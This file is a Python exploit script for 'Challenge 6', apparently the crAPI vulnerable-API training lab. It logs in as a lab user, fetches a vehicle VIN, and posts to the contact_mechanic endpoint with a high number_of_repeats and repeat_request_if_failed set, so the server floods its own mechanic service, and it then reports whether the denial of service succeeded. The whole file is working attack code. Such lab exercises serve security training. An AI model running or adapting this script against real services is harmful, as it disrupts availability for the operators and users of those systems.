#!/usr/bin/env python3
"""Challenge 6: Layer 7 DoS via contact mechanic"""
import argparse, sys
from pathlib import Path
from typing import Optional, List, Dict, Any
import requests, yaml

def load_config(path: str) -> dict:
    with open(path, "r") as f:
        return yaml.safe_load(f)

def login(base_url: str, email: str, password: str, timeout: float = 15) -> Optional[str]:
    try:
        r = requests.post(f"{base_url.rstrip('/')}/identity/api/auth/login",
                         json={"email": email, "password": password}, timeout=timeout)
        return r.json().get("token") or r.json().get("access_token")
    except:
        return None

def get_vehicles(base_url: str, token: str, timeout: float = 15) -> List[Dict[str, Any]]:
    headers = {"Authorization": f"Bearer {token}"}
    try:
        r = requests.get(f"{base_url.rstrip('/')}/identity/api/v2/vehicle/vehicles",
                        headers=headers, timeout=timeout).json()
        return r if isinstance(r, list) else r.get("vehicles") or []
    except:
        return []

def contact_mechanic_dos(base_url: str, token: str, vin: str, repeats: int = 1000, timeout: float = 15) -> Optional[Dict[str, Any]]:
    headers = {"Authorization": f"Bearer {token}"}
    payload = {
        "mechanic_api": f"{base_url.rstrip('/')}/workshop/api/mechanic/receive_report",
        "mechanic_code": "TRAC_JHN",
        "number_of_repeats": repeats,
        "problem_details": "DoS test",
        "repeat_request_if_failed": True,
        "vin": vin
    }
    try:
        return requests.post(f"{base_url.rstrip('/')}/workshop/api/merchant/contact_mechanic",
                            json=payload, headers=headers, timeout=timeout).json()
    except:
        return None

def main():
    parser = argparse.ArgumentParser(description="Challenge 6: Layer 7 DoS")
    parser.add_argument("--config", default="../crapi_config.yaml")
    parser.add_argument("--user-email", default="mike1@my.lab")
    parser.add_argument("--repeat-count", type=int, default=1000)
    args = parser.parse_args()

    cfg = load_config(Path(args.config))
    base_url = cfg["target"]["base_url"]
    password = cfg["known_users"]["password"]

    print(f"[*] Challenge 6: Layer 7 DoS\n[*] Target: {base_url}\n" + "-"*60)

    token = login(base_url, args.user_email, password)
    if not token:
        print("[!] Login failed"); sys.exit(1)
    print("[+] Logged in")

    vehicles = get_vehicles(base_url, token)
    if not vehicles:
        print("[!] No vehicles found"); sys.exit(1)
    vin = vehicles[0].get("vin")
    print(f"[+] Using VIN: {vin}")

    print(f"\n[*] Sending DoS payload (repeat_count={args.repeat_count})...")
    response = contact_mechanic_dos(base_url, token, vin, args.repeat_count)

    if response:
        msg = response.get("message", "")
        if "DoS" in msg or "unavailable" in msg:
            print(f"[+] SUCCESS! DoS triggered")
            print(f"[+] Response: {msg}")
            print(f"[!] VULNERABLE: Layer 7 DoS possible via contact_mechanic")
        else:
            print(f"[*] Response: {msg}")
    else:
        print("[!] Request failed")

if __name__ == "__main__":
    main()
